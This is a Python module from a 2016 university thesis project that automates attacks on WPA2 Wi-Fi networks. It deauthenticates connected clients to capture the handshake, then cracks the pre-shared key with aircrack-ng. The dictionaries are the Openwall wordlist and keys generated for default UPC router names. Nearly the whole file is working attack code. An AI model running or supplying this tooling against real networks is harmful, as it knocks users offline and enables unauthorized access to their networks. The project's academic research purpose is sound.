#!/usr/bin/env python3
"""
WPA2 cracking

Automation of MitM Attack on WiFi Networks
Bachelor's Thesis UIFS FIT VUT
Martin Vondracek
2016

#Implementation notes
- Airodump-ng writes its Text User Interface to stderr, stdout is empty.
- Aircrack-ng does not flush when stdout is redirected to file and -q is set.
- Feedback from running subprocesses is obtained from their stdout and stderr. Method Popen.communicate() is
  unfortunately not suitable. 'Read data from stdout and stderr, until end-of-file is reached. Wait for process
  to terminate.'
  Reading of stdout and stderr is done continuously while the subprocess is running. This is achieved by that
  the subprocess is writing its stdout and stderr to temporary files. These files are then opened again and continuous
  writing and reading is performed. There's only one writer and one reader per file.
- Subprocesses' feedback result is available as an update of process' state, flags and stats. State describes current
  position in a lifecycle of the process. Flags can be set or cleared based on events during life of the process.
  Flags can be later cleared or set by other parts of the script - after the flag was recognised and appropriate
  reaction was performed.

"""
import logging
import os
import pipes
import re
import subprocess
import tempfile
import time
from enum import Enum, unique
from typing import List, TextIO

import pkg_resources

from .model import WirelessAccessPoint, WirelessInterface
from .common import WirelessCapturer, deauthenticate, WifimitmError

__author__ = 'Martin Vondracek'
__email__ = 'xvondr20@stud.fit.vutbr.cz'

logger = logging.getLogger(__name__)


class Wpa2Error(WifimitmError):
    pass


class PassphraseNotInDictionaryError(Wpa2Error):
    pass


class PassphraseNotInAnyDictionaryError(Wpa2Error):
    pass


class Wpa2Cracker(object):
    """
    "WPA/WPA2 supports many types of authentication beyond pre-shared keys. aircrack-ng can ONLY crack pre-shared keys.
    So make sure airodump-ng shows the network as having the authentication type of PSK, otherwise, don't bother trying
    to crack it.
    There is another important difference between cracking WPA/WPA2 and WEP. This is the approach used to crack
    the WPA/WPA2 pre-shared key. Unlike WEP, where statistical methods can be used to speed up the cracking process,
    only plain brute force techniques can be used against WPA/WPA2. That is, because the key is not static,
    so collecting IVs like when cracking WEP encryption, does not speed up the attack. The only thing that does give
    the information to start an attack is the handshake between client and AP."
    `cracking_wpa [Aircrack-ng] <http://www.aircrack-ng.org/doku.php?id=cracking_wpa>`_

    Although cracking WPA/WPA2 is based on brute force, used dictionary can be personalized by available AP details to
    increase the chance of finding the key.
    """

    @unique
    class State(Enum):
        """
        Wpa2Cracker process states.
        """
        ok = 0  # cracking
        new = 1  # just started
        terminated = 100

    def __init__(self, ap, dictionary):
        if not ap.wpa_handshake_cap_path:
            raise ValueError

        self.ap = ap

        self.process = None
        self.state = None
        self.tmp_dir = None

        # process' stdout, stderr for its writing
        self.process_stdout_w = None
        self.process_stderr_w = None
        # process' stdout, stderr for reading
        self.process_stdout_r = None
        self.process_stderr_r = None

        self.dictionary = dictionary
        logger.debug("dictionary '{}'".format(str(self.dictionary)))

    def start(self):
        self.state = self.__class__.State.new
        self.tmp_dir = tempfile.TemporaryDirectory()

        # temp files (write, read) for stdout and stderr
        self.process_stdout_w = tempfile.NamedTemporaryFile(prefix='wpa2crack-stdout', dir=self.tmp_dir.name)
        self.process_stdout_r = open(self.process_stdout_w.name, 'r')

        self.process_stderr_w = tempfile.NamedTemporaryFile(prefix='wpa2crack-stderr', dir=self.tmp_dir.name)
        self.process_stderr_r = open(self.process_stderr_w.name, 'r')

        cmd = ['aircrack-ng',
               '-a', '2',
               '--bssid', self.ap.bssid,
               '-q',  # If set, no status information is displayed.
               '-w', '-',  # dictionary is provided to stdin
               '-l', 'psk.ascii',  # Write the key into a file.
               self.ap.wpa_handshake_cap_path]
        self.process = subprocess.Popen(cmd, cwd=self.tmp_dir.name,
                                        stdin=self.dictionary,
                                        stdout=self.process_stdout_w, stderr=self.process_stderr_w,
                                        universal_newlines=True)
        # NOTE: Aircrack-ng does not flush when stdout is redirected to file and -q is set.
        self.state = self.__class__.State.ok
        logger.debug('Wpa2Cracker started; cwd=' + self.tmp_dir.name + ', ' +
                     'stdout @ ' + self.process_stdout_w.name +
                     ', stderr @ ' + self.process_stderr_w.name)

    def update_state(self):
        """
        Update state of running process from process' feedback.
        Read new output from stdout and stderr, check if process is alive.
        Aircrack-ng does not flush when stdout is redirected to file and -q is set. Complete stdout is available
        in the moment of termination of aircrack-ng.
        :raises PassphraseNotInDictionaryError: If passphrase was not found in provided dictionary.
        """
        # is process running?
        if self.process.poll() is not None:
            self.state = self.__class__.State.terminated

        # check every added line in stdout
        for line in self.process_stdout_r:
            if 'KEY FOUND!' in line:
                self.ap.save_psk_file(os.path.join(self.tmp_dir.name, 'psk.ascii'))
                logger.debug('Wpa2Cracker found key!')
            if 'Passphrase not in dictionary' in line:
                logger.debug('Passphrase not in dictionary.')
                raise PassphraseNotInDictionaryError()

        # check stderr
        if self.process_stderr_r and not self.process_stderr_r.closed:
            for line in self.process_stderr_r:  # type: str
                # NOTE: stderr should be empty
                logger.warning("Unexpected stderr of 'aircrack-ng': '{}'. {}".format(line, str(self)))

    def stop(self):
        """
        Stop running process.
        If the process is stopped or already finished, exitcode is returned.
        In the case that there was not any process, nothing happens.
        :return:
        """
        if self.process:
            exitcode = self.process.poll()
            if exitcode is None:
                self.process.terminate()
                time.sleep(1)
                self.process.kill()
                exitcode = self.process.poll()
                logger.debug('Wpa2Cracker killed')

            self.process = None
            self.state = self.__class__.State.terminated
            return exitcode

    def clean(self):
        """
        Clean after running process.
        Running process is stopped, temp files are closed and deleted,
        :return:
        """
        logger.debug('Wpa2Cracker clean')
        # if the process is running, stop it and then clean
        if self.process:
            self.stop()
        # close opened files
        self.process_stdout_r.close()
        self.process_stdout_r = None

        self.process_stdout_w.close()
        self.process_stdout_w = None

        self.process_stderr_r.close()
        self.process_stderr_r = None

        self.process_stderr_w.close()
        self.process_stderr_w = None

        self.dictionary.close()

        # remove tmp
        self.tmp_dir.cleanup()
        self.tmp_dir = None

        # remove state
        self.state = None


def get_personalized_dictionaries(target: WirelessAccessPoint) -> List[TextIO]:
    """
    Create and return dictionary personalized by available AP details.
    :type target: WirelessAccessPoint
    :param target: targeted AP

    :rtype: List[TextIO]
    :return: list of opened personalized dictionaries
    """
    dictionaries = []
    if re.match(r'^UPC\d{7}$', target.essid):
        t = pipes.Template()
        t.prepend('upc_keys {} {}'.format(target.essid, '24'), '.-')
        t.append('grep "  -> WPA2 phrase for "', '--')
        t.append('sed "s/^  -> WPA2 phrase for \S* = \'\(.*\)\'$/\\1/"', '--')
        d = t.open('dictionary-pipeline', 'r')
        dictionaries.append(d)

    return dictionaries


class Wpa2Attacker(object):
    """
    Main class providing attack on WPA2 secured network.
    """

    def __init__(self, ap, monitoring_interface: WirelessInterface):
        """
        :type monitoring_interface: WirelessInterface
        :param monitoring_interface: wireless interface for attack
        """
        self.ap = ap
        self.monitoring_interface = monitoring_interface  # type: WirelessInterface

    def start(self, force=False):
        """
        Start attack on WPA2 secured network.
        If targeted network have already been cracked and `force` is False, attack is skipped.
        :param force: attack even if network have already been cracked
        :raises PassphraseNotInAnyDictionaryError: If passphrase was not in any available dictionary.
        """
        if not force and self.ap.is_cracked():
            #  AP already cracked
            logger.info('Known ' + str(self.ap))
            return

        if not self.ap.wpa_handshake_cap_path:
            with WirelessCapturer(interface=self.monitoring_interface,
                                  ap=self.ap) as capturer:
                while not self.ap.wpa_handshake_cap_path:
                    capturer.update()
                    while not capturer.flags['detected_wpa_handshake']:
                        time.sleep(2)
                        capturer.update()
                        result = capturer.get_capture_result()
                        if len(result):  # if AP was detected by capturer
                            tmp_ap = capturer.get_capture_result()[0]
                            if len(tmp_ap.associated_stations) == 0:
                                logger.info('Network is empty.')
                            # deauthenticate stations to acquire WPA handshake
                            for st in tmp_ap.associated_stations:
                                deauthenticate(self.monitoring_interface, st)
                                time.sleep(2)
                                capturer.update()
                                if capturer.flags['detected_wpa_handshake']:
                                    break
                        else:
                            logger.info('Network not detected by capturer yet.')
                    self.ap.save_wpa_handshake_cap(capturer.wpa_handshake_cap_path)
                    logger.info('WPA handshake detected.')

        # prepare dictionaries
        dictionaries = []
        dictionaries += get_personalized_dictionaries(target=self.ap)  # personalized first
        # NOTE: Dictionary 'openwall_all.lst' has been compiled by Solar Designer
        # of Openwall Project. http://www.openwall.com/wordlists/ License is attached at 'resources/LICENSE'.
        dictionaries.append(pkg_resources.resource_stream(__package__, 'resources/test_dictionary.lst'))
        dictionaries.append(pkg_resources.resource_stream(__package__, 'resources/openwall_password.lst'))

        for idx, dictionary in enumerate(dictionaries):
            try:
                cracker = Wpa2Cracker(ap=self.ap, dictionary=dictionary)
                cracker.start()
                while not self.ap.is_cracked():
                    cracker.update_state()
                    logger.debug('Wpa2Cracker: ' + str(cracker.state))
                    time.sleep(5)
            except PassphraseNotInDictionaryError:
                logger.info('Passphrase not in dictionary. ({}/{})'.format(idx + 1, len(dictionaries)))
            finally:
                cracker.stop()
                cracker.clean()
                dictionary.close()

            if self.ap.is_cracked():
                logger.info('Cracked ' + str(self.ap))
                break
        else:
            # Passphrase was not in any dictionary, otherwise the above loop would break.
            logger.error('Passphrase not in any dictionary.')
            raise PassphraseNotInAnyDictionaryError()

        # AP is now cracked, close the dictionaries
        for dictionary in dictionaries:
            dictionary.close()


def verify_psk(ap: WirelessAccessPoint, psk: str):
    dictionary_w = tempfile.NamedTemporaryFile(mode='w', prefix='dictionary')
    dictionary_w.write(psk)
    dictionary_w.flush()
    dictionary_r = open(dictionary_w.name, 'r')

    cracker = Wpa2Cracker(ap=ap, dictionary=dictionary_r)
    try:
        cracker.start()
        while not ap.is_cracked():
            cracker.update_state()
            logger.debug('Wpa2Cracker: ' + str(cracker.state))
            time.sleep(1)
    except PassphraseNotInDictionaryError:
        result = False
    else:
        result = True
        logger.info('Verified ' + str(ap))
    finally:
        cracker.stop()
        cracker.clean()
        dictionary_r.close()
        dictionary_w.close()
    return result
